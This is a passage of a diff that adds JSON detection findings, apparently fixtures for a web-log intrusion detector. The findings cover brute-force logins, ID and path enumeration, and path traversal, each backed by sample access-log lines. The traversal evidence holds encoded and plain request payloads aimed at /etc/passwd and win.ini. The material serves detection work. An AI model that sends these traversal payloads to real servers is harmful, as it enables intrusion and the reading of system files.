+        "2001:db8:5eed:9:2d00:bc16:5c2c:e8bd - - [01/Nov/2026:02:16:12 +0000] \"GET /v1/projects/1042 HTTP/1.1\" 401 442 \"-\" \"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36\"",
+        "2001:db8:5eed:9:1c4:a15d:23d7:1e53 - - [01/Nov/2026:02:23:08 +0000] \"GET /v1/projects/1044 HTTP/1.1\" 404 489 \"-\" \"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36\"",
+        "2001:db8:5eed:9:571a:b4ee:510c:b28a - - [01/Nov/2026:02:28:24 +0000] \"GET /v1/projects/1046 HTTP/1.1\" 403 247 \"-\" \"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36\"",
+        "2001:db8:5eed:9:79e6:9be5:aa50:962 - - [01/Nov/2026:02:36:33 +0000] \"GET /v1/projects/1048 HTTP/1.1\" 404 399 \"-\" \"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36\""
+      ],
+      "detail": "distributed across 15 addresses in 2001:db8:5eed:9::/64: template /v1/projects/{id}: 25 distinct IDs (1000..1048) within 21600s forming a sequential walk; 23 answered non-2xx; refusal signal: 92% of IDs answered 401/403/404/410."
+    },
+    {
+      "rule_id": "BEH-LOW-AND-SLOW",
+      "title": "Low-and-slow path enumeration",
+      "severity": "medium",
+      "client_ip": "2001:db8:5eed:9::/64",
+      "first_seen": "2026-11-01T00:00:33+00:00",
+      "last_seen": "2026-11-01T05:56:36+00:00",
+      "event_count": 103,
+      "technique": "T1595.003",
+      "evidence": [
+        "2001:db8:5eed:9:59aa:c584:7047:c0a6 - - [01/Nov/2026:01:59:03 +0000] \"GET /v1/projects/1036 HTTP/1.1\" 403 582 \"-\" \"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36\"",
+        "2001:db8:5eed:9:76bb:a2a9:5cb9:bee3 - - [01/Nov/2026:02:02:28 +0000] \"GET /v1/billing-37 HTTP/1.1\" 403 193 \"-\" \"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36\"",
+        "2001:db8:5eed:9:ba6a:d9cf:c2c7:2e3c - - [01/Nov/2026:02:05:54 +0000] \"GET /v1/projects/1038 HTTP/1.1\" 403 531 \"-\" \"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36\"",
+        "2001:db8:5eed:9:e4e8:fda6:6a0c:2c4c - - [01/Nov/2026:02:08:26 +0000] \"GET /v1/backup-39 HTTP/1.1\" 404 381 \"-\" \"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36\"",
+        "2001:db8:5eed:9:c430:c37e:80b3:af69 - - [01/Nov/2026:02:13:38 +0000] \"GET /v1/internal-41 HTTP/1.1\" 404 582 \"-\" \"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36\""
+      ],
+      "detail": "distributed across 30 addresses in 2001:db8:5eed:9::/64: 40 miss responses (401/403/404/410) of 42 requests (95%) across 40 distinct paths within 21600s; patient forced browsing that stays under the short-window rules."
+    },
+    {
+      "rule_id": "BEH-BRUTE-FORCE",
+      "title": "Login brute force",
+      "severity": "high",
+      "client_ip": "203.0.113.26",
+      "first_seen": "2026-11-01T00:23:46+00:00",
+      "last_seen": "2026-11-01T00:31:10+00:00",
+      "event_count": 60,
+      "technique": "T1110",
+      "evidence": [
+        "203.0.113.26 - - [01/Nov/2026:00:24:23 +0000] \"POST /members/sign-in HTTP/1.1\" 401 333 \"https://shop.example.com/members/sign-in\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+        "203.0.113.26 - - [01/Nov/2026:00:24:32 +0000] \"POST /members/sign-in HTTP/1.1\" 401 339 \"https://shop.example.com/members/sign-in\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+        "203.0.113.26 - - [01/Nov/2026:00:24:41 +0000] \"POST /members/sign-in HTTP/1.1\" 401 333 \"https://shop.example.com/members/sign-in\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+        "203.0.113.26 - - [01/Nov/2026:00:24:48 +0000] \"POST /members/sign-in HTTP/1.1\" 401 316 \"https://shop.example.com/members/sign-in\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+        "203.0.113.26 - - [01/Nov/2026:00:24:57 +0000] \"POST /members/sign-in HTTP/1.1\" 401 310 \"https://shop.example.com/members/sign-in\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\""
+      ],
+      "detail": "10 login POSTs within 300s (threshold 10); 10 explicit 401/403 failures."
+    },
+    {
+      "rule_id": "BEH-ID-ENUM",
+      "title": "Sequential ID enumeration",
+      "severity": "medium",
+      "client_ip": "203.0.113.28",
+      "first_seen": "2026-11-01T00:24:23+00:00",
+      "last_seen": "2026-11-01T05:05:01+00:00",
+      "event_count": 81,
+      "technique": "T1595.003",
+      "evidence": [
+        "203.0.113.28 - - [01/Nov/2026:01:33:39 +0000] \"GET /v1/invoices/5020 HTTP/1.1\" 200 13915 \"-\" \"python-requests/2.31.0\"",
+        "203.0.113.28 - - [01/Nov/2026:01:36:53 +0000] \"GET /v1/invoices/5021 HTTP/1.1\" 200 22474 \"-\" \"python-requests/2.31.0\"",
+        "203.0.113.28 - - [01/Nov/2026:01:40:24 +0000] \"GET /v1/invoices/5022 HTTP/1.1\" 200 15056 \"-\" \"python-requests/2.31.0\"",
+        "203.0.113.28 - - [01/Nov/2026:01:44:04 +0000] \"GET /v1/invoices/5023 HTTP/1.1\" 403 434 \"-\" \"python-requests/2.31.0\"",
+        "203.0.113.28 - - [01/Nov/2026:01:47:35 +0000] \"GET /v1/invoices/5024 HTTP/1.1\" 200 3640 \"-\" \"python-requests/2.31.0\""
+      ],
+      "detail": "template /v1/invoices/{id}: 25 distinct IDs (5000..5024) within 21600s forming a sequential walk; 15 answered non-2xx; refusal signal: 60% of IDs answered 401/403/404/410."
+    },
+    {
+      "rule_id": "BEH-LOW-AND-SLOW",
+      "title": "Low-and-slow path enumeration",
+      "severity": "medium",
+      "client_ip": "203.0.113.28",
+      "first_seen": "2026-11-01T00:24:23+00:00",
+      "last_seen": "2026-11-01T05:01:52+00:00",
+      "event_count": 43,
+      "technique": "T1595.003",
+      "evidence": [
+        "203.0.113.28 - - [01/Nov/2026:04:09:31 +0000] \"GET /v1/invoices/5064 HTTP/1.1\" 403 280 \"-\" \"python-requests/2.31.0\"",
+        "203.0.113.28 - - [01/Nov/2026:04:12:59 +0000] \"GET /v1/invoices/5065 HTTP/1.1\" 403 267 \"-\" \"python-requests/2.31.0\"",
+        "203.0.113.28 - - [01/Nov/2026:04:16:21 +0000] \"GET /v1/invoices/5066 HTTP/1.1\" 403 548 \"-\" \"python-requests/2.31.0\"",
+        "203.0.113.28 - - [01/Nov/2026:04:19:24 +0000] \"GET /v1/invoices/5067 HTTP/1.1\" 403 302 \"-\" \"python-requests/2.31.0\"",
+        "203.0.113.28 - - [01/Nov/2026:04:36:44 +0000] \"GET /v1/invoices/5072 HTTP/1.1\" 403 482 \"-\" \"python-requests/2.31.0\""
+      ],
+      "detail": "40 miss responses (401/403/404/410) of 73 requests (55%) across 40 distinct paths within 21600s; patient forced browsing that stays under the short-window rules."
+    },
+    {
+      "rule_id": "BEH-BRUTE-SUCCESS",
+      "title": "Successful login after brute force",
+      "severity": "critical",
+      "client_ip": "203.0.113.26",
+      "first_seen": "2026-11-01T00:26:17+00:00",
+      "last_seen": "2026-11-01T00:31:16+00:00",
+      "event_count": 61,
+      "technique": "T1110",
+      "evidence": [
+        "203.0.113.26 - - [01/Nov/2026:00:30:49 +0000] \"POST /members/sign-in HTTP/1.1\" 401 318 \"https://shop.example.com/members/sign-in\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+        "203.0.113.26 - - [01/Nov/2026:00:30:57 +0000] \"POST /members/sign-in HTTP/1.1\" 401 317 \"https://shop.example.com/members/sign-in\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+        "203.0.113.26 - - [01/Nov/2026:00:31:04 +0000] \"POST /members/sign-in HTTP/1.1\" 401 340 \"https://shop.example.com/members/sign-in\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+        "203.0.113.26 - - [01/Nov/2026:00:31:10 +0000] \"POST /members/sign-in HTTP/1.1\" 401 334 \"https://shop.example.com/members/sign-in\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+        "203.0.113.26 - - [01/Nov/2026:00:31:16 +0000] \"POST /members/sign-in HTTP/1.1\" 302 0 \"https://shop.example.com/members/sign-in\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\""
+      ],
+      "detail": "Login succeeded (HTTP 302) after 60 failed attempts (401/403); credentials may be compromised."
+    },
+    {
+      "rule_id": "BEH-BRUTE-FORCE",
+      "title": "Login brute force",
+      "severity": "high",
+      "client_ip": "203.0.113.23",
+      "first_seen": "2026-11-01T00:26:56+00:00",
+      "last_seen": "2026-11-01T00:46:39+00:00",
+      "event_count": 40,
+      "technique": "T1110",
+      "evidence": [
+        "203.0.113.23 - - [01/Nov/2026:00:29:30 +0000] \"POST /login HTTP/1.1\" 401 512 \"https://shop.example.com/login\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+        "203.0.113.23 - - [01/Nov/2026:00:30:01 +0000] \"POST /login HTTP/1.1\" 401 512 \"https://shop.example.com/login\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+        "203.0.113.23 - - [01/Nov/2026:00:30:29 +0000] \"POST /login HTTP/1.1\" 401 512 \"https://shop.example.com/login\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+        "203.0.113.23 - - [01/Nov/2026:00:31:00 +0000] \"POST /login HTTP/1.1\" 401 512 \"https://shop.example.com/login\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+        "203.0.113.23 - - [01/Nov/2026:00:31:28 +0000] \"POST /login HTTP/1.1\" 401 512 \"https://shop.example.com/login\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\""
+      ],
+      "detail": "10 login POSTs within 300s (threshold 10); 10 explicit 401/403 failures."
+    },
+    {
+      "rule_id": "BEH-404-BURST",
+      "title": "Burst of 404/403/410 responses (path enumeration)",
+      "severity": "medium",
+      "client_ip": "203.0.113.21",
+      "first_seen": "2026-11-01T00:39:19+00:00",
+      "last_seen": "2026-11-01T00:51:33+00:00",
+      "event_count": 150,
+      "technique": "T1595.003",
+      "evidence": [
+        "203.0.113.21 - - [01/Nov/2026:00:46:59 +0000] \"GET /files4/ HTTP/1.1\" 404 198 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+        "203.0.113.21 - - [01/Nov/2026:00:47:05 +0000] \"GET /logs4/ HTTP/1.1\" 403 324 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+        "203.0.113.21 - - [01/Nov/2026:00:47:09 +0000] \"GET /data4/ HTTP/1.1\" 404 208 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+        "203.0.113.21 - - [01/Nov/2026:00:47:14 +0000] \"GET /web4/ HTTP/1.1\" 404 518 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+        "203.0.113.21 - - [01/Nov/2026:00:47:19 +0000] \"GET /site4/ HTTP/1.1\" 404 276 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\""
+      ],
+      "detail": "slow enumeration: 100 miss responses (404/403/410) within 900s (threshold 100); consistent with directory guessing."
+    },
+    {
+      "rule_id": "BEH-LOW-AND-SLOW",
+      "title": "Low-and-slow path enumeration",
+      "severity": "medium",
+      "client_ip": "203.0.113.21",
+      "first_seen": "2026-11-01T00:39:19+00:00",
+      "last_seen": "2026-11-01T00:51:33+00:00",
+      "event_count": 150,
+      "technique": "T1595.003",
+      "evidence": [
+        "203.0.113.21 - - [01/Nov/2026:00:42:10 +0000] \"GET /files1/ HTTP/1.1\" 403 570 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+        "203.0.113.21 - - [01/Nov/2026:00:42:15 +0000] \"GET /logs1/ HTTP/1.1\" 404 488 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+        "203.0.113.21 - - [01/Nov/2026:00:42:19 +0000] \"GET /data1/ HTTP/1.1\" 404 386 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+        "203.0.113.21 - - [01/Nov/2026:00:42:25 +0000] \"GET /web1/ HTTP/1.1\" 404 435 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+        "203.0.113.21 - - [01/Nov/2026:00:42:31 +0000] \"GET /site1/ HTTP/1.1\" 404 190 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\""
+      ],
+      "detail": "40 miss responses (401/403/404/410) of 40 requests (100%) across 40 distinct paths within 21600s; patient forced browsing that stays under the short-window rules."
+    },
+    {
+      "rule_id": "BEH-BRUTE-SUCCESS",
+      "title": "Successful login after brute force",
+      "severity": "critical",
+      "client_ip": "203.0.113.23",
+      "first_seen": "2026-11-01T00:42:36+00:00",
+      "last_seen": "2026-11-01T00:47:11+00:00",
+      "event_count": 41,
+      "technique": "T1110",
+      "evidence": [
+        "203.0.113.23 - - [01/Nov/2026:00:45:08 +0000] \"POST /login HTTP/1.1\" 401 512 \"https://shop.example.com/login\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+        "203.0.113.23 - - [01/Nov/2026:00:45:38 +0000] \"POST /login HTTP/1.1\" 401 512 \"https://shop.example.com/login\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+        "203.0.113.23 - - [01/Nov/2026:00:46:10 +0000] \"POST /login HTTP/1.1\" 401 512 \"https://shop.example.com/login\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+        "203.0.113.23 - - [01/Nov/2026:00:46:39 +0000] \"POST /login HTTP/1.1\" 401 512 \"https://shop.example.com/login\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+        "203.0.113.23 - - [01/Nov/2026:00:47:11 +0000] \"POST /login HTTP/1.1\" 302 0 \"https://shop.example.com/login\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\""
+      ],
+      "detail": "Login succeeded (HTTP 302) after 40 failed attempts (401/403); credentials may be compromised."
+    },
+    {
+      "rule_id": "BEH-BRUTE-FORCE",
+      "title": "Login brute force",
+      "severity": "medium",
+      "client_ip": "203.0.113.27",
+      "first_seen": "2026-11-01T00:52:22+00:00",
+      "last_seen": "2026-11-01T00:58:20+00:00",
+      "event_count": 81,
+      "technique": "T1110",
+      "evidence": [
+        "203.0.113.27 - - [01/Nov/2026:00:52:45 +0000] \"POST /oauth2/token HTTP/1.1\" 200 37 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0 Build/5\"",
+        "203.0.113.27 - - [01/Nov/2026:00:52:51 +0000] \"POST /oauth2/token HTTP/1.1\" 200 37 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Build/0\"",
+        "203.0.113.27 - - [01/Nov/2026:00:52:54 +0000] \"POST /oauth2/token HTTP/1.1\" 200 37 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15 Build/1\"",
+        "203.0.113.27 - - [01/Nov/2026:00:52:58 +0000] \"POST /oauth2/token HTTP/1.1\" 200 37 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0 Build/2\"",
+        "203.0.113.27 - - [01/Nov/2026:00:53:02 +0000] \"POST /oauth2/token HTTP/1.1\" 200 37 \"-\" \"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1 Build/3\""
+      ],
+      "detail": "10 login POSTs within 300s (threshold 10); 0 explicit 401/403 failures; status-agnostic; lower confidence; user agent rotated across 6 values."
+    },
+    {
+      "rule_id": "BEH-BRUTE-SUCCESS",
+      "title": "Successful login after brute force",
+      "severity": "high",
+      "client_ip": "203.0.113.27",
+      "first_seen": "2026-11-01T00:53:20+00:00",
+      "last_seen": "2026-11-01T00:58:20+00:00",
+      "event_count": 68,
+      "technique": "T1110",
+      "evidence": [
+        "203.0.113.27 - - [01/Nov/2026:00:58:01 +0000] \"POST /oauth2/token HTTP/1.1\" 200 37 \"-\" \"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36 Build/4\"",
+        "203.0.113.27 - - [01/Nov/2026:00:58:06 +0000] \"POST /oauth2/token HTTP/1.1\" 200 37 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0 Build/5\"",
+        "203.0.113.27 - - [01/Nov/2026:00:58:11 +0000] \"POST /oauth2/token HTTP/1.1\" 200 37 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Build/0\"",
+        "203.0.113.27 - - [01/Nov/2026:00:58:15 +0000] \"POST /oauth2/token HTTP/1.1\" 200 37 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15 Build/1\"",
+        "203.0.113.27 - - [01/Nov/2026:00:58:20 +0000] \"POST /oauth2/token HTTP/1.1\" 200 412 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Build/0\""
+      ],
+      "detail": "response size changed from ~37 to 412 bytes after 67 uniform answers; likely success."
+    },
+    {
+      "rule_id": "BEH-BRUTE-FORCE",
+      "title": "Login brute force",
+      "severity": "medium",
+      "client_ip": "203.0.113.22",
+      "first_seen": "2026-11-01T01:00:34+00:00",
+      "last_seen": "2026-11-01T01:04:28+00:00",
+      "event_count": 60,
+      "technique": "T1110",
+      "evidence": [
+        "203.0.113.22 - - [01/Nov/2026:01:00:56 +0000] \"POST /wp-login.php HTTP/1.1\" 200 2645 \"https://shop.example.com/wp-login.php\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+        "203.0.113.22 - - [01/Nov/2026:01:01:01 +0000] \"POST /wp-login.php HTTP/1.1\" 200 2583 \"https://shop.example.com/wp-login.php\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+        "203.0.113.22 - - [01/Nov/2026:01:01:04 +0000] \"POST /wp-login.php HTTP/1.1\" 200 2628 \"https://shop.example.com/wp-login.php\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+        "203.0.113.22 - - [01/Nov/2026:01:01:08 +0000] \"POST /wp-login.php HTTP/1.1\" 200 2629 \"https://shop.example.com/wp-login.php\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+        "203.0.113.22 - - [01/Nov/2026:01:01:11 +0000] \"POST /wp-login.php HTTP/1.1\" 200 2509 \"https://shop.example.com/wp-login.php\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\""
+      ],
+      "detail": "10 login POSTs within 300s (threshold 10); 0 explicit 401/403 failures; status-agnostic; lower confidence."
+    },
+    {
+      "rule_id": "BEH-404-BURST",
+      "title": "Burst of 404/403/410 responses (path enumeration)",
+      "severity": "medium",
+      "client_ip": "2001:db8:bad:1::/64",
+      "first_seen": "2026-11-01T01:23:58+00:00",
+      "last_seen": "2026-11-01T01:25:37+00:00",
+      "event_count": 200,
+      "technique": "T1595.003",
+      "evidence": [
+        "2001:db8:bad:1:253c:5089:e2e:a1ef - - [01/Nov/2026:01:24:05 +0000] \"GET /files/ HTTP/1.1\" 404 533 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+        "2001:db8:bad:1:b174:c9f2:4600:6fdd - - [01/Nov/2026:01:24:06 +0000] \"GET /logs/ HTTP/1.1\" 404 213 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+        "2001:db8:bad:1:57e2:ccd5:58f1:37c8 - - [01/Nov/2026:01:24:06 +0000] \"GET /data/ HTTP/1.1\" 404 483 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+        "2001:db8:bad:1:d4f6:2f4e:ec88:eca5 - - [01/Nov/2026:01:24:06 +0000] \"GET /web/ HTTP/1.1\" 404 383 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+        "2001:db8:bad:1:cfe4:1c99:a70f:1071 - - [01/Nov/2026:01:24:06 +0000] \"GET /site/ HTTP/1.1\" 404 172 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\""
+      ],
+      "detail": "distributed across 200 addresses in 2001:db8:bad:1::/64: 20 miss responses (404/403/410) within 60s (threshold 20); consistent with directory guessing."
+    },
+    {
+      "rule_id": "BEH-LOW-AND-SLOW",
+      "title": "Low-and-slow path enumeration",
+      "severity": "medium",
+      "client_ip": "2001:db8:bad:1::/64",
+      "first_seen": "2026-11-01T01:23:58+00:00",
+      "last_seen": "2026-11-01T01:25:37+00:00",
+      "event_count": 200,
+      "technique": "T1595.003",
+      "evidence": [
+        "2001:db8:bad:1:9f88:9352:a40c:46da - - [01/Nov/2026:01:24:15 +0000] \"GET /files1/ HTTP/1.1\" 404 563 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+        "2001:db8:bad:1:4d:e96e:b14e:adc7 - - [01/Nov/2026:01:24:16 +0000] \"GET /logs1/ HTTP/1.1\" 404 271 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+        "2001:db8:bad:1:2b9:d27d:39b2:9c58 - - [01/Nov/2026:01:24:16 +0000] \"GET /data1/ HTTP/1.1\" 404 520 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+        "2001:db8:bad:1:c766:270f:c10b:7384 - - [01/Nov/2026:01:24:16 +0000] \"GET /web1/ HTTP/1.1\" 404 228 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+        "2001:db8:bad:1:e14f:64ef:8800:76b4 - - [01/Nov/2026:01:24:16 +0000] \"GET /site1/ HTTP/1.1\" 404 544 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\""
+      ],
+      "detail": "distributed across 40 addresses in 2001:db8:bad:1::/64: 40 miss responses (401/403/404/410) of 40 requests (100%) across 40 distinct paths within 21600s; patient forced browsing that stays under the short-window rules."
+    },
+    {
+      "rule_id": "SIG-TRAVERSAL",
+      "title": "Path traversal pattern",
+      "severity": "high",
+      "client_ip": "203.0.113.16",
+      "first_seen": "2026-11-01T01:45:20+00:00",
+      "last_seen": "2026-11-01T01:45:58+00:00",
+      "event_count": 7,
+      "technique": "T1190",
+      "evidence": [
+        "203.0.113.16 - - [01/Nov/2026:01:45:20 +0000] \"GET /download?file=../../../../etc/passwd HTTP/1.1\" 400 432 \"-\" \"python-requests/2.31.0\"",
+        "203.0.113.16 - - [01/Nov/2026:01:45:30 +0000] \"GET /download?file=..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1\" 404 438 \"-\" \"python-requests/2.31.0\"",
+        "203.0.113.16 - - [01/Nov/2026:01:45:34 +0000] \"GET /download?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1\" 404 547 \"-\" \"python-requests/2.31.0\"",
+        "203.0.113.16 - - [01/Nov/2026:01:45:38 +0000] \"GET /download?file=....//....//....//etc/passwd HTTP/1.1\" 403 494 \"-\" \"python-requests/2.31.0\"",
+        "203.0.113.16 - - [01/Nov/2026:01:45:41 +0000] \"GET /view?page=..\\..\\..\\windows\\win.ini HTTP/1.1\" 404 372 \"-\" \"python-requests/2.31.0\""
+      ],
+      "detail": "7 matching request(s); patterns: repeated-dotdot, dotdot-target, etc-passwd, nested-dotdot, win-ini."
+    },
+    {
+      "rule_id": "SIG-XSS",
+      "title": "Script injection (XSS) pattern",
+      "severity": "medium",
+      "client_ip": "198.51.100.251",
+      "first_seen": "2026-11-01T01:59:53+00:00",
+      "last_seen": "2026-11-01T01:59:53+00:00",
+      "event_count": 1,
+      "technique": "T1190",
+      "evidence": [
